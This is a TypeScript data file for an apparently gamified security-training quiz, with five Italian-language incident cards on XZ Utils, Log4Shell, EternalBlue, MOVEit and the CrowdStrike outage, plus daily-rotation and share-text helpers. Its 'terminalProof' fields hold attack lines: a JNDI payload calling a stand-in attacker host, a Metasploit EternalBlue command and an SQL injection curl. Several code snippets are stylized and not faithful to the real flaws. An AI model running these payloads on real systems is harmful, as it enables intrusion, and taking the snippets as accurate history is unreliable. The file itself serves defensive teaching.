import { SkillDomain } from '../types';

export interface DailyBreachIncident {
  id: string;
  dayIndex: number;
  title: string;
  cveId: string;
  threatActor: string;
  targetArchitecture: string;
  severity: 'CRITICAL' | 'HIGH' | 'MAXIMUM DEFCON';
  cvssScore: number;
  scenario: string;
  vulnerableCodeSnippet: string;
  codeLanguage: string;
  vulnerableLineNumber: number;
  prompt: string;
  options: {
    id: string;
    text: string;
    isCorrect: boolean;
    mitigation: string;
  }[];
  rootCauseAnalysis: {
    cwe: string;
    attackVector: string;
    historicalImpact: string;
    remediationPatch: string;
    terminalProof: string;
  };
  xpReward: number;
  eloReward: number;
}

export const DAILY_BREACHES: DailyBreachIncident[] = [
  {
    id: 'breach_xz_utils',
    dayIndex: 1,
    title: 'XZ Utils Supply Chain Backdoor',
    cveId: 'CVE-2024-3094',
    threatActor: 'Jia Tan (Advanced Persistent Threat / State-Sponsored)',
    targetArchitecture: 'OpenSSH (sshd) via liblzma on Debian/Fedora',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 10.0,
    scenario: 'Un backdoor sofisticato iniettato nell\'infrastruttura di build di xz-utils aggancia `RSA_public_decrypt` in OpenSSH tramite GNU indirect function (IFUNC) per intercettare l\'autenticazione ed eseguire codice arbitrario non autenticato prima di sshd.',
    codeLanguage: 'c',
    vulnerableLineNumber: 4,
    vulnerableCodeSnippet: `// xz-utils m4 macro injection hook
1: static void _lzma_hook_openssh_init(void) {
2:   void *handle = dlopen("liblzma.so.5", RTLD_NOW);
3:   // Hook RSA verification routine in sshd
4:   void **rsa_func = (void**)dlsym(handle, "RSA_public_decrypt");
5:   if (rsa_func) *rsa_func = (void*)&backdoor_magic_payload_exec;
6: }`,
    prompt: 'Quale tecnica ha consentito al backdoor di alterare il flusso di autenticazione OpenSSH senza modificare direttamente il codice sorgente di sshd?',
    options: [
      {
        id: 'xz_1',
        text: 'Aggancio IFUNC resolver durante il linking dinamico systemd-notify in sshd',
        isCorrect: true,
        mitigation: 'Rimuovere dipendenze esterne di pre-linking da sshd e compilare solo pacchetti verificati.'
      },
      {
        id: 'xz_2',
        text: 'Iniezione di un driver kernel via DKMS all\'avvio del server',
        isCorrect: false,
        mitigation: 'Non applicabile: l\'attacco avviene a livello user-mode ld.so.'
      },
      {
        id: 'xz_3',
        text: 'Sfruttamento di un buffer overflow classico nello stack di ssh-keygen',
        isCorrect: false,
        mitigation: 'Non è un buffer overflow ma una supply chain code injection.'
      },
      {
        id: 'xz_4',
        text: 'Bypass del firewall iptables tramite pacchetti GRE incapsulati',
        isCorrect: false,
        mitigation: 'La vulnerabilità risiede nella crittografia RSA applicativa, non nel layer di rete.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-506: Embedded Malicious Code (Supply Chain Attack)',
      attackVector: 'Script M4 nel tarball di release modificavano il build stage iniettando codice oggetto offuscato nei file di test .lzma.',
      historicalImpact: 'Avrebbe compromesso l\'accesso root SSH a milioni di server Linux mondiali se non fosse stato individuato dall\'ingegnere Andres Freund per una latenza anomala di 500ms.',
      remediationPatch: 'Rollback immediato a xz-utils 5.4.x e rimozione del linking a libsystemd nei binari OpenSSH.',
      terminalProof: '$ ssh -i id_rsa -o "CertificateInvalid=..." target-server\n[DEBUG] Backdoor signature payload triggered: root shell spawned'
    },
    xpReward: 80,
    eloReward: 25
  },
  {
    id: 'breach_log4shell',
    dayIndex: 2,
    title: 'Log4Shell: Zero-Click JNDI / LDAP RCE',
    cveId: 'CVE-2021-44228',
    threatActor: 'Mass Internet Scanning & Ransomware Groups',
    targetArchitecture: 'Apache Log4j 2.x Java Application Framework',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 10.0,
    scenario: 'Log4j valuta ricorsivamente le espressioni all\'interno dei messaggi registrati. Se un log contiene la stringa `${jndi:ldap://...}`, Log4j effettua una query LDAP remota scaricando e caricando dinamicamente una classe Java non attendibile.',
    codeLanguage: 'java',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// Controller di login applicativo Java Spring Boot
1: @PostMapping("/login")
2: public ResponseEntity<?> login(@RequestHeader("User-Agent") String userAgent) {
3:     logger.info("Tentativo di accesso ricevuto da browser: {}", userAgent);
4:     return ResponseEntity.ok("Handshake in corso");
5: }`,
    prompt: 'Quale parametro del runtime JVM blocca l\'esecuzione di codice remoto scaricato via JNDI/LDAP come workaround immediato?',
    options: [
      {
        id: 'l4j_1',
        text: '-Dlog4j2.formatMsgNoLookups=true oppure eliminazione di JndiLookup.class',
        isCorrect: true,
        mitigation: 'Disabilita la risoluzione delle lookup JNDI nei formati dei messaggi di log.'
      },
      {
        id: 'l4j_2',
        text: '-Xmx4096m per allocare maggiore memoria heap al garbage collector',
        isCorrect: false,
        mitigation: 'Aumentare la RAM non previene l\'iniezione di classi remote.'
      },
      {
        id: 'l4j_3',
        text: 'Impostare HTTP Strict Transport Security (HSTS) a 31536000 secondi',
        isCorrect: false,
        mitigation: 'HSTS protegge il browser ma il payload colpisce il backend parser.'
      },
      {
        id: 'l4j_4',
        text: 'Riavvio di Tomcat con permessi chmod 777 su /opt/tomcat',
        isCorrect: false,
        mitigation: 'Chmod 777 aumenta gravemente la superficie di attacco locale.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement',
      attackVector: 'String injection in header HTTP (User-Agent, X-Forwarded-For) o form inputs registrati dal logger.',
      historicalImpact: 'Ha impattato oltre l\'80% dell\'ecosistema enterprise Java globale (Apple, Amazon AWS, Steam, VMware).',
      remediationPatch: 'Aggiornamento obbligatorio a Log4j 2.17.1+ e rimozione del protocollo JNDI dai formati di default.',
      terminalProof: '$ curl -H "User-Agent: \${jndi:ldap://attacker.c2/Exploit.class}" https://target.corp/\n[+] LDAP query received on port 1389: Payload delivered!'
    },
    xpReward: 80,
    eloReward: 25
  },
  {
    id: 'breach_eternalblue',
    dayIndex: 3,
    title: 'EternalBlue SMBv1 Remote Kernel Pool Corruption',
    cveId: 'CVE-2017-0144',
    threatActor: 'Equation Group (NSA) / Shadow Brokers / WannaCry',
    targetArchitecture: 'Windows SMBv1 Server Kernel Driver (srv.sys)',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.8,
    scenario: 'Una discrepanza tra casting matematico a 16 e 32 bit nella gestione del comando SMB_COM_TRANSACTION2_SECONDARY provoca un buffer overflow nel pool di memoria non di paging del kernel Windows (srv.sys), permettendo RCE con privilegi SYSTEM.',
    codeLanguage: 'c',
    vulnerableLineNumber: 4,
    vulnerableCodeSnippet: `// SrvOs2FeaListSizeToNt() in srv.sys
1: ULONG SrvOs2FeaListSizeToNt(PFEALIST FeaList) {
2:   // Errore di overflow aritmetico nella conversione della lista attributi
3:   USHORT listSize = FeaList->cbList;
4:   ULONG calculatedSize = (ULONG)listSize + 0x1000; // Integer Wrap-around!
5:   return calculatedSize;
6: }`,
    prompt: 'Quale misura architetturale a livello di networking e di sistema operativo elimina alla radice la superficie di attacco di EternalBlue?',
    options: [
      {
        id: 'eb_1',
        text: 'Disabilitazione permanente di SMBv1 e blocco perimetrale delle porte TCP 445 e 139',
        isCorrect: true,
        mitigation: 'SMBv1 è un protocollo deprecato risalente agli anni 80; usare solo SMBv3 crittografato.'
      },
      {
        id: 'eb_2',
        text: 'Attivazione di Windows Defender Real-time Cloud Protection su porta 80',
        isCorrect: false,
        mitigation: 'L\'attacco colpisce il kernel SMB su porta 445, non la porta web 80.'
      },
      {
        id: 'eb_3',
        text: 'Abilitazione di NTLMv1 al posto di Kerberos nel Domain Controller',
        isCorrect: false,
        mitigation: 'NTLMv1 è insicuro e non correlato al bug di pool allocation in srv.sys.'
      },
      {
        id: 'eb_4',
        text: 'Aumento della subnet mask da /24 a /16 per isolare il gateway',
        isCorrect: false,
        mitigation: 'Allargare la subnet estende la propagazione dei worm wormable.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-190: Integer Overflow or Wraparound in Kernel Driver',
      attackVector: 'Invio di pacchetti SMBv1 malformati contenenti attributi estesi (FEA List) calcolati in modo incoerente.',
      historicalImpact: 'Ha alimentato il ransomware WannaCry e NotPetya, causando miliardi di dollari di danni ospedalieri e industriali.',
      remediationPatch: 'Installazione della patch Microsoft MS17-010 e rimozione della feature Windows `SMB1Protocol`.',
      terminalProof: '$ msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.50; run"\n[+] Meterpreter session 1 opened (NT AUTHORITY\\SYSTEM)'
    },
    xpReward: 85,
    eloReward: 25
  },
  {
    id: 'breach_moveit',
    dayIndex: 4,
    title: 'MOVEit Transfer SQLi Pre-Auth Data Exfiltration',
    cveId: 'CVE-2023-34362',
    threatActor: 'Cl0p Ransomware Cartel (FIN11)',
    targetArchitecture: 'Progress MOVEit Transfer Web App (.NET / MySQL)',
    severity: 'CRITICAL',
    cvssScore: 9.8,
    scenario: 'Un parametro HTTP non sanitizzato nell\'endpoint `guestaccess.aspx` consentiva un\'SQL Injection pre-autenticazione. Gli aggressori hanno alterato la sessione del database per impersonare l\'amministratore e caricare un webshell stealth (`human2.aspx`).',
    codeLanguage: 'csharp',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// guestaccess.aspx handler in MOVEit.DMZ.ClassLib
1: string transactionId = Request.Headers["X-siLock-Transaction"];
2: if (!string.IsNullOrEmpty(transactionId)) {
3:     string query = "SELECT * FROM institutions WHERE InstID = '" + transactionId + "'";
4:     MySqlCommand cmd = new MySqlCommand(query, conn);
5:     MySqlDataReader reader = cmd.ExecuteReader();
6: }`,
    prompt: 'Quale principio di programmazione difensiva avrebbe impedito l\'esecuzione del payload SQL nell\'endpoint guestaccess.aspx?',
    options: [
      {
        id: 'mov_1',
        text: 'Adozione rigorosa di Prepared Statements con parametri tipizzati (MySqlParameter)',
        isCorrect: true,
        mitigation: 'I parametri vincolano l\'input al tipo di dato, impedendo a apici e commenti SQL di alterare l\'albero AST della query.'
      },
      {
        id: 'mov_2',
        text: 'Cifratura del database con BitLocker a livello di volume disco',
        isCorrect: false,
        mitigation: 'BitLocker protegge da furto fisico del disco, non dalle query malevole inviate al demone attivo.'
      },
      {
        id: 'mov_3',
        text: 'Utilizzo di certificati autofirmati TLS con hash MD5',
        isCorrect: false,
        mitigation: 'MD5 è insicuro e il layer TLS trasporta inalterato il payload applicativo SQLi.'
      },
      {
        id: 'mov_4',
        text: 'Rimozione dei cookie di sessione da parte del load balancer',
        isCorrect: false,
        mitigation: 'Il bug era pre-autenticazione e non richiedeva cookie preesistenti.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-89: SQL Injection in Unauthenticated Web Handlers',
      attackVector: 'Iniezione di payload SQL tramite header HTTP custom `X-siLock-Transaction` manipolati.',
      historicalImpact: 'Esfiltrazione massiva di dati da centinaia di banche, governi ed enti previdenziali in tutto il mondo.',
      remediationPatch: 'Sanitizzazione obbligatoria degli header e migrazione completa a query parametrizzate in C# Entity Framework.',
      terminalProof: '$ curl -H "X-siLock-Transaction: 1\' OR 1=1--" https://transfer.corp/guestaccess.aspx\nHTTP/1.1 200 OK (Admin Session Token Forged)'
    },
    xpReward: 80,
    eloReward: 24
  },
  {
    id: 'breach_crowdstrike',
    dayIndex: 5,
    title: 'CrowdStrike Falcon Sensor IPC Null-Pointer Logic Fault',
    cveId: 'INCIDENT-2024-CS-01',
    threatActor: 'Channel File 291 Rapid Response Content Update',
    targetArchitecture: 'CSAgent.sys Kernel Driver on Windows 10/11 & Server',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.9,
    scenario: 'Il sensore kernel Falcon ha ricevuto il file di configurazione `Channel File 291` contenente 21 campi logici non inizializzati. Il driver `CSAgent.sys` ha tentato di dereferenziare un puntatore nullo a memoria non mappata, innescando una bugcheck PAGE_FAULT_IN_NONPAGED_AREA (BSOD globale).',
    codeLanguage: 'c',
    vulnerableLineNumber: 4,
    vulnerableCodeSnippet: `// CSAgent.sys Named Pipe Parser Routine
1: NTSTATUS EvaluateChannelRules(PCHANNEL_PACKET Packet) {
2:   PRULE_ENTRY Entry = Packet->RuleTable[Packet->ActiveRuleIndex];
3:   // Mancata verifica di puntatore valido prima dell'ispezione
4:   ULONG signatureId = Entry->SignaturePointer->Id; // NULL POINTER DEREFERENCE!
5:   return ProcessSignature(signatureId);
6: }`,
    prompt: 'Quale test architetturale di Quality Assurance nel kernel ring-0 previene crash globali da Channel File updates?',
    options: [
      {
        id: 'cs_1',
        text: 'Validazione formale degli schemi di input e staged canary deployment ring-based',
        isCorrect: true,
        mitigation: 'Rilasciare gli update a ondate (canary rings 0 -> 1 -> 2) e verificare i bounds nel parser driver.'
      },
      {
        id: 'cs_2',
        text: 'Esecuzione dei driver antivirus in modalità utente tramite interprete Python',
        isCorrect: false,
        mitigation: 'I sensori EDR necessitano di hook ring-0 kernel per monitorare chiamate syscall native.'
      },
      {
        id: 'cs_3',
        text: 'Disabilitazione del Safe Mode su tutte le macchine Windows Server',
        isCorrect: false,
        mitigation: 'Il Safe Mode è stato l\'unico meccanismo che ha permesso di eliminare manualmente il file corrotto.'
      },
      {
        id: 'cs_4',
        text: 'Compilazione del driver kernel disabilitando i controlli di integrità WHQL',
        isCorrect: false,
        mitigation: 'WHQL garantisce la firma digitale di Microsoft e l\'integrità del codice kernel.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-476: NULL Pointer Dereference in Ring-0 Device Driver',
      attackVector: 'Distribuzione di content update dinamico privo di validazione semantica su milioni di endpoint enterprise.',
      historicalImpact: '8.5 milioni di computer Windows bloccati in boot loop (aeroporti, ospedali, banche, media televisivi).',
      remediationPatch: 'Controllo esplicito `if (!Entry || !Entry->SignaturePointer) return STATUS_INVALID_DATA;` e roll-out a cluster progressivi.',
      terminalProof: 'CRITICAL_PROCESS_DIED: BugCheck 0x50 (PAGE_FAULT_IN_NONPAGED_AREA)\nArguments: ffff800000000000, 0000000000000000, fffff8012a4f1020, 0000000000000002'
    },
    xpReward: 85,
    eloReward: 25
  }
];

/**
 * Returns today's breach deterministically based on day of year.
 * Every user worldwide sees the exact same incident on the same day.
 */
export function getDailyBreachForDate(customDate?: string): DailyBreachIncident {
  const d = customDate ? new Date(customDate) : new Date();
  const startOfYear = new Date(d.getFullYear(), 0, 0);
  const diff = d.getTime() - startOfYear.getTime();
  const oneDay = 1000 * 60 * 60 * 24;
  const dayOfYear = Math.floor(diff / oneDay);

  const index = Math.abs(dayOfYear) % DAILY_BREACHES.length;
  return DAILY_BREACHES[index];
}

/**
 * Generates Wordle-style share text for social bragging & viral engagement.
 */
export function generateDailyBreachShareCard(
  incident: DailyBreachIncident,
  secondsTaken: number,
  isCorrect: boolean,
  currentStreak: number,
  userElo: number
): string {
  const dateStr = new Date().toISOString().slice(0, 10);
  const resultIcon = isCorrect ? '🟩' : '🟥';
  const streakFires = '🔥'.repeat(Math.min(5, Math.max(1, currentStreak)));

  return `🛡️ ZeroDay (0xDAY) // Daily 0xBreach #${incident.dayIndex}
📅 ${dateStr} · ${incident.cveId}
${resultIcon} Triage: ${isCorrect ? 'SUCCESS' : 'BREACH DETECTED'} (${secondsTaken.toFixed(1)}s)
${streakFires} Daily Incident Streak: ${currentStreak} giorni
⚡ ELO Operativo: ${userElo}

Riuscirai a mitigare l'attacco di oggi prima di me?
👉 https://zeroday.gg`;
}
